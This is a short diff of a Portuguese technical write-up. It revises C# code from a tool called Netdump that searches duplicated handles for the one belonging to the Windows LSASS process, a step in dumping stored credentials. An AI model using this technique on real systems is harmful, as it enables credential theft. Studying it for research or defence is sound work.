@@ -465,13 +465,12 @@ E, finalmente! Temos um handle pro LSASS! Vamos pausar a execução do código e
 ```csharp
 if (pathExe.Equals("Process", StringComparison.OrdinalIgnoreCase))
 {
-	Process[] localByName = Process.GetProcessesByName("lsass");
-
-	int lsass_pid = localByName[0].Id;
-
-	if (Netdump.Invokes.GetProcessId(hDuplicate) == lsass_pid)
+	if (Netdump.Invokes.QueryFullProcessImageName(hDuplicate, 0, fileNameBuilder, ref bufferLength))
 	{
-		Console.WriteLine($"[+] {hexValue}, PID: {Netdump.Invokes.GetProcessId(hDuplicate)}");
+		if (fileNameBuilder.ToString().EndsWith("lsass.exe"))
+		{
+			Console.WriteLine($"[+] {hexValue}, PID: {Netdump.Invokes.GetProcessId(hDuplicate)}, Path: {fileNameBuilder.ToString()}");
+		}
 	}
 }
 ```
